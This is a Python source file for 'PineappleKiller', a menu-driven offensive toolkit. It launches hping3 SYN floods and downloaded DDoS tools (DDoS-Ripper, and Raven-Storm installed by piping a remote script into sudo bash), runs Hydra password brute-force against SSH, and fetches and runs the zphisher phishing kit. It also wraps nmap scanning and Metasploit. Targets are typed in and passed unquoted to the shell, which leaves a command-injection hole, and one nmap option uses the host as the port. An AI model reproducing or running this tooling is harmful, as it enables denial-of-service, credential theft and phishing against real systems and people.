from pineappledev.pineappledev import *
import os
import time
def pineapplekillerclear():
    try:
        os.system("clear")
    except:
        print("")
pineapplekillerclear()
def pineapplekillerlogo():
    print("""\x1b[0;35m

██▓███   ██▓ ███▄    █ ▓█████ ▄▄▄       ██▓███   ██▓███   ██▓    ▓█████  ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  
▓██░  ██▒▓██▒ ██ ▀█   █ ▓█   ▀▒████▄    ▓██░  ██▒▓██░  ██▒▓██▒    ▓█   ▀  ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
▓██░ ██▓▒▒██▒▓██  ▀█ ██▒▒███  ▒██  ▀█▄  ▓██░ ██▓▒▓██░ ██▓▒▒██░    ▒███   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
▒██▄█▓▒ ▒░██░▓██▒  ▐▌██▒▒▓█  ▄░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▄█▓▒ ▒▒██░    ▒▓█  ▄ ▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ░  ░░██░▒██░   ▓██░░▒████▒▓█   ▓██▒▒██▒ ░  ░▒██▒ ░  ░░██████▒░▒████▒▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
▒▓▒░ ░  ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒   ▓▒█░▒▓▒░ ░  ░▒▓▒░ ░  ░░ ▒░▓  ░░░ ▒░ ░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░▒ ░      ▒ ░░ ░░   ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░     ░▒ ░     ░ ░ ▒  ░ ░ ░  ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░░        ▒ ░   ░   ░ ░    ░    ░   ▒   ░░       ░░         ░ ░      ░   ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
        ░           ░    ░  ░     ░  ░                      ░  ░   ░  ░░  ░    ░      ░  ░    ░  ░   ░  ░   ░     
                                                                                                                                            
    \x1b[0;31m
#################################################################
                            \x1b[0;34mBy x04000
                    \x1b[0;33mGithub: github.com/x04000
                    \x1b[0;32mBase: Python, PineappleDev
                          \x1b[0;36mVersion: 1.1
\x1b[0;31m#################################################################
\x1b[0;35m
    """)
pineapplekillerlogo()
print("Installing modules...")
try:
    os.system("sudo apt-get install git")
    os.system("sudo apt-get install hping3")
    os.system("sudo apt-get install etherape")
    os.system("sudo apt-get install metasploit-framework")
    os.system("sudo apt-get install wireshark")
    time.sleep(2)
except:
    print("PineappleKiller > A error ocurred during module installation!")
    exit()
def pineapplekillermenu():
    try:
        while(True):
            os.system("clear")
            pineapplekillerlogo()
            print("""
███▄ ▄███▓▓█████  ███▄    █  █    ██ 
▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒
▓██    ▓██░▒███   ▓██  ▀█ ██▒▓██  ▒██░
▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░
▒██▒   ░██▒░▒████▒▒██░   ▓██░▒▒█████▓ 
░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ 
░  ░      ░ ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ 
░      ░      ░      ░   ░ ░  ░░░ ░ ░ 
    ░      ░  ░         ░    ░     

    \x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit               \x1b[0;31m[\x1b[0;36m04\x1b[0;31m] \x1b[0;32mPing           \x1b[0;31m[\x1b[0;36m08\x1b[0;31m] \x1b[0;32mFile modifier
    \x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mDoS                \x1b[0;31m[\x1b[0;36m05\x1b[0;31m] \x1b[0;32mNmap           \x1b[0;31m[\x1b[0;36m09\x1b[0;31m] \x1b[0;32mHydra
    \x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mDDoS               \x1b[0;31m[\x1b[0;36m06\x1b[0;31m] \x1b[0;32mSqlMap         \x1b[0;31m[\x1b[0;36m10\x1b[0;31m] \x1b[0;32mZphisher
    \x1b[0;31m[\x1b[0;36m03\x1b[0;31m] \x1b[0;32mTrafic view        \x1b[0;31m[\x1b[0;36m07\x1b[0;31m] \x1b[0;32mMetasploit     \x1b[0;31m[\x1b[0;36m11\x1b[0;31m] \x1b[0;32mSherlock
            """)
            pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
            if str(pineapplekilleroption) == "00":
                print("\x1b[0;31mPineappleKiller > \x1b[0;36mHave a good day :)")
                break
            if str(pineapplekilleroption) == "01":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""[DoS]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mHping3
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    pineapplekillersettedtarget = 0
                    pineapplekillertarget = ""
                    pineapplekillerport = "80"
                    while(True):
                        pineapplekillerclear()
                        pineapplekillerlogo()
                        print("""\x1b[0;36m[PineappleKiller DoS Hping3]

\x1b[0;36mtarget      \x1b[0;31m- \x1b[0;32mDefine target Host
\x1b[0;36mport        \x1b[0;31m- \x1b[0;32mDefine port
\x1b[0;36mattack      \x1b[0;31m- \x1b[0;32mStart attack
                        """)
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        print("")
                        if str(pineapplekilleroption) == "attack":
                            if pineapplekillersettedtarget == 1:
                                pineapplekillerclear()
                                pineapplekillerlogo()
                                print("[\x1b[0;36mPineappleKiller DoS Hping3 \x1b[0;31mAttacking]\x1b[0;36m")
                                try:
                                    pineapplekillerdoscommand = "sudo hping3 -p "+pineapplekillerport+" -S --flood "+pineapplekillertarget
                                    os.system(pineapplekillerdoscommand)
                                    time.sleep(5)
                                except:
                                    print("")
                            else:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Undefined target!")
                        if str(pineapplekilleroption) == "target":
                            print("[Target]")
                            pineapplekillertarget = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            pineapplekillersettedtarget = 1
                            print("")
                            print("Target set to: "+pineapplekillertarget)
                            time.sleep(2)
                        if str(pineapplekilleroption) == "port":
                            print("[Port]")
                            pineapplekillerport = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
            if str(pineapplekilleroption) == "02":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""
\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mDDoS-Ripper
\x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mRaven-Storm
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("Checking panel installation...")
                    def pineapplekillercheckdripper():
                        def pineapplekillerdripperinst():
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            print("The panel is not installed!")
                            print("Do you want to install them? [Y/n]")
                            pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            if str(pineapplekilleroption) == "Y":
                                if os.path.isdir("DDoS-Ripper"):
                                    os.system("sudo rm -rfv DDoS-Ripper")
                                print("")
                                print("Downloading panel > Via Github")
                                try:
                                    os.system("git clone https://github.com/palahsu/DDoS-Ripper")
                                    time.sleep(2)
                                    return pineapplekillercheckdripper()
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            else:
                                print("")
                        if os.path.isdir("DDoS-Ripper"):
                            if os.path.isfile("DDoS-Ripper/DRipper.py"):
                                pineapplekillersettedtarget = 0
                                pineapplekillertarget = ""
                                pineapplekillerport = "80"
                                pineapplekillerturbo = "135"
                                pineapplekillerquiet = "0"
                                while(True):
                                    pineapplekillerclear()
                                    pineapplekillerlogo()
                                    print("""\x1b[0;36m[PineappleKiller DDoS Ripper]

\x1b[0;36mtarget      \x1b[0;31m- \x1b[0;32mDefine target Host
\x1b[0;36mport        \x1b[0;31m- \x1b[0;32mDefine port
\x1b[0;36mturbo       \x1b[0;31m- \x1b[0;32mSet turbo (135-443)
\x1b[0;36mquiet       \x1b[0;31m- \x1b[0;32mSet quiet mode
\x1b[0;36mattack      \x1b[0;31m- \x1b[0;32mStart attack
                                    """)
                                    pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                    print("")
                                    if str(pineapplekilleroption) == "attack":
                                        if pineapplekillersettedtarget == 1:
                                            pineapplekillerclear()
                                            pineapplekillerlogo()
                                            print("[\x1b[0;36mPineappleKiller DDoS Ripper \x1b[0;31mAttacking]\x1b[0;36m")
                                            try:
                                                pineapplekillerparameters = "-s "+pineapplekillertarget+" -p "+pineapplekillerport+" -t "+pineapplekillerturbo
                                                if pineapplekillerquiet == "1":
                                                    pineapplekillerparameters = pineapplekillerparameters+" -q"
                                                pineapplekillerddosrippercommand = "cd DDoS-Ripper && python3 DRipper.py "+pineapplekillerparameters+" && cd .."
                                                os.system(pineapplekillerddosrippercommand)
                                                time.sleep(1)
                                            except:
                                                print("")
                                        else:
                                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Undefined target!")
                                    if str(pineapplekilleroption) == "target":
                                        print("[Target]")
                                        pineapplekillertarget = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                        pineapplekillersettedtarget = 1
                                        print("")
                                        print("Target set to: "+pineapplekillertarget)
                                        time.sleep(2)
                                    if str(pineapplekilleroption) == "port":
                                        print("[Port]")
                                        pineapplekillerport = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                    if str(pineapplekilleroption) == "turbo":
                                        print("[Turbo]")
                                        pineapplekillerturbo = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                    if str(pineapplekilleroption) == "quiet":
                                        if str(pineapplekillerquiet) == "0":
                                            pineapplekillerquiet = 1
                                        if str(pineapplekillerquiet) == "1":
                                            pineapplekillerquiet = 0
                            else:
                                pineapplekillerdripperinst()
                        else:
                            pineapplekillerdripperinst()
                    pineapplekillercheckdripper()
                if str(pineapplekilleroption) == "02":
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("Do you want to install the panel? [Y/n]")
                    pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                    if pineapplekilleroption == "Y":
                        pineapplekillerclear()
                        pineapplekillerlogo()
                        print("Installing Raven Storm...")
                        try:
                            os.system("curl -s https://raw.githubusercontent.com/Taguar258/Raven-Storm/master/install.sh | sudo bash -s")
                            print("PineappleKiller > Installed!")
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    else:
                        try:
                            os.system("sudo rst")
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "03":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""[Trafic view]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mEtherape
\x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mWireshark
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    try:
                        os.system("sudo etherape")
                    except:
                        print("")
                if str(pineapplekilleroption) == "02":
                    try:
                        os.system("wireshark")
                    except:
                        print("")

            if str(pineapplekilleroption) == "04":
                pineapplekillerclear()
                pineapplekillerlogo()
                pineapplekillerhost = input("\x1b[0;31mPineappleKiller \x1b[0;36mHost\x1b[0;31m> \x1b[0;32m")
                try:
                    pineapplekillerping = "ping "+pineapplekillerhost
                    os.system(pineapplekillerping)
                    time.sleep(5)
                except:
                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "05":
                while(True):
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("\x1b[0;31m[\x1b[0;36mNmap\x1b[0;31m]")
                    print("""
    \x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
    \x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mPing sweep
    \x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mPort open map
    \x1b[0;31m[\x1b[0;36m03\x1b[0;31m] \x1b[0;32mFull port and mac map
    \x1b[0;31m[\x1b[0;36m04\x1b[0;31m] \x1b[0;32mSO and Version map
                    """)
                    pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                    if str(pineapplekilleroption) == "00":
                        print("")
                    if str(pineapplekilleroption) == "01":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  \x1b[0;36mHost\x1b[0;31m> \x1b[0;32m")
                        pineapplekillersweep = input("\x1b[0;31mPineappleKiller  \x1b[0;36mSweep\x1b[0;31m> \x1b[0;32m")
                        pineapplekillernmapsweepcommand = "nmap -sP "+pineapplekillerhost+"/"+pineapplekillersweep
                        try:
                            os.system(pineapplekillernmapsweepcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    if str(pineapplekilleroption) == "02":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  Host> \x1b[0;32m")
                        pineapplekillerport = input("\x1b[0;31mPineappleKiller  Port> \x1b[0;32m")
                        pineapplekillernmapportcommand = "nmap -p "+pineapplekillerhost+" -sT "+pineapplekillerhost
                        try:
                            os.system(pineapplekillernmapportcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    if str(pineapplekilleroption) == "03":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  \x1b[0;36mHOST\x1b[0;31m> \x1b[0;32m")
                        pineapplekillernmaphostcommand = "sudo nmap -sS "+pineapplekillerhost
                        try:
                            os.system(pineapplekillernmaphostcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    if str(pineapplekilleroption) == "04":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  \x1b[0;36mHOST\x1b[0;31m> \x1b[0;32m")
                        pineapplekillernmapsohostcommand = "nmap -A -T4 "+pineapplekillerhost
                        try:
                            os.system(pineapplekillernmapsohostcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
            if str(pineapplekilleroption) == "06":
                print("Coming soon")
                time.sleep(2)

            if str(pineapplekilleroption) == "07":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("\x1b[0;36m[Metasploit Framework]\x1b[0;32m")
                try:
                    os.system("sudo msfdb init && msfconsole")
                except:
                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "08":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""[File Modifier]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mPineappleDevGUI
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("\x1b[0;31m[PineappleDev File Modifier \x1b[0;32mGUI]\x1b[0;32m")
                    try:
                        p_filemodifiergui()
                    except:
                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "09":
                while(True):
                    pineapplekillerdefaultwordlist = "pineapplekiller/pineapplekillerwordlist"
                    pineapplekillerusernamessh = ""
                    pineapplekillersettedusernamessh = 0
                    pineapplekillerwordlist = ""
                    pineapplekillersettedwordlist = 0
                    pineapplekillerhost = ""
                    pineapplekillersettedhost = 0
                    pineapplekillerprocediment = ""
                    pineapplekillersettedprocediment = 0
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("""\x1b[0;31m[\x1b[0;36mHydra\x1b[0;31m]

    \x1b[0;36mhost              \x1b[0;31m- \x1b[0;32mHost
    \x1b[0;36musername          \x1b[0;31m- \x1b[0;32mUsername (SSH)
    \x1b[0;36mwordlist          \x1b[0;31m- \x1b[0;32mWordlist (pineapplekiller have a default wordlist)
    \x1b[0;36mprocediment       \x1b[0;31m- \x1b[0;32mProcediment
    \x1b[0;36mrun               \x1b[0;31m- \x1b[0;32mRun Hydra
                    """)
                    pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                    print("")
                    if str(pineapplekilleroption) == "run":
                        if pineapplekillersettedhost == 1:
                            pineapplekillerhydraoptions = pineapplekillersettedusernamessh+pineapplekillersettedwordlist+pineapplekillersettedprocediment
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            print("[\x1b[0;36mPineappleKiller Hydra \x1b[0;31mAttacking]\x1b[0;36m")
                            if pineapplekillerhydraoptions == 0:
                                try:
                                    pineapplekillerhydracommand = "hydra -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost
                                    os.system(pineapplekillerhydracommand)
                                    time.sleep(5)
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            if pineapplekillerhydraoptions == 4:
                                try:
                                    pineapplekillerhydracommand = "hydra -l "+pineapplekillerusernamessh+" -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost+" -t 4 ssh"
                                    os.system(pineapplekillerhydracommand)
                                    time.sleep(5)
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            if pineapplekillerhydraoptions == 5:
                                try:
                                    pineapplekillerhydracommand = "hydra -P "+pineapplekillerwordlist+" "+pineapplekillerhost
                                    os.system(pineapplekillerhydracommand)
                                    time.sleep(5)
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            if pineapplekillerhydraoptions == 6:
                                try:
                                    pineapplekillerhydracommand = "hydra -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                    os.system(pineapplekillerhydracommand)
                                    time.sleep(5)
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            if pineapplekillerhydraoptions == 9:
                                try:
                                    pineapplekillerhydracommand = "hydra -l "+pineapplekillerusernamessh+" -P "+pineapplekillerwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                    os.system(pineapplekillerhydracommand)
                                    time.sleep(5)
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            if pineapplekillerhydraoptions == 10:
                                try:
                                    pineapplekillerhydracommand = "hydra -l "+pineapplekillerusernamessh+" -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                    os.system(pineapplekillerhydracommand)
                                    time.sleep(5)
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            if pineapplekillerhydraoptions == 11:
                                try:
                                    pineapplekillerhydracommand = "hydra -P "+pineapplekillerwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                    os.system(pineapplekillerhydracommand)
                                    time.sleep(5)
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Undefined target!")
                    if str(pineapplekilleroption) == "host":
                        print("[Host]")
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        pineapplekillersettedhost = 1
                        print("")
                        print("Target set to: "+pineapplekillerhost)
                        time.sleep(2)
                    if str(pineapplekilleroption) == "username":
                        print("[Username (SSH)]")
                        pineapplekillerusernamessh = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        pineapplekillersettedusernamessh = 4
                    if str(pineapplekilleroption) == "wordlist":
                        print("[Wordlist]")
                        pineapplekillerwordlist = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        pineapplekillersettedwordlist = 5
                    if str(pineapplekilleroption) == "procediment":
                        print("[Procediment]")
                        pineapplekillerprocediment = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        pineapplekillersettedprocediment = 6
            
            if pineapplekilleroption == "10":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("Checking zphisher installation...")
                def pineapplekillercheckzphisher():
                    def pineapplekillerzphisherinst():
                        print("The zphisher is not installed!")
                        print("Do you want to install them? [Y/n]")
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        if str(pineapplekilleroption) == "Y":
                            if os.path.isdir("zphisher"):
                                os.system("sudo rm -rfv zphisher")
                            print("")
                            print("Downloading zphisher > Via Github")
                            try:
                                os.system("git clone https://github.com/htr-tech/zphisher")
                                time.sleep(2)
                                return pineapplekillercheckzphisher()
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            print("")
                    if os.path.isdir("zphisher"):
                        if os.path.isfile("zphisher/zphisher.sh"):
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            try:
                                os.system("cd zphisher && bash zphisher.sh && cd ..")
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            pineapplekillerzphisherinst()
                    else:
                        pineapplekillerzphisherinst()
                pineapplekillercheckzphisher()

            if pineapplekilleroption == "11":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("Checking sherlock installation...")
                def pineapplekillerchecksherlock():
                    def pineapplekillersherlockinst():
                        print("The sherlock is not installed!")
                        print("Do you want to install them? [Y/n]")
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        if str(pineapplekilleroption) == "Y":
                            if os.path.isdir("sherlock"):
                                os.system("sudo rm -rfv sherlock")
                            print("")
                            print("Downloading sherlock > Via Github")
                            try:
                                os.system("git clone https://github.com/sherlock-project/sherlock")
                                os.system("cd sherlock && python3 -m pip install -r requirements.txt && cd ..")
                                time.sleep(2)
                                return pineapplekillerchecksherlock()
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            print("")
                    if os.path.isdir("sherlock"):
                        if os.path.isfile("sherlock/sherlock/sherlock.py"):
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            pineapplekillerusername = input("\x1b[0;31mPineappleKiller  \x1b[0;36mUsername\x1b[0;31m> \x1b[0;32m")
                            try:
                                os.system("cd sherlock && cd sherlock && python3 sherlock.py "+pineapplekillerusername+" && cd .. && cd ..")
                                time.sleep(5)
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            pineapplekillersherlockinst()
                    else:
                        pineapplekillersherlockinst()
                pineapplekillerchecksherlock()

    except:
        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
pineapplekillermenu()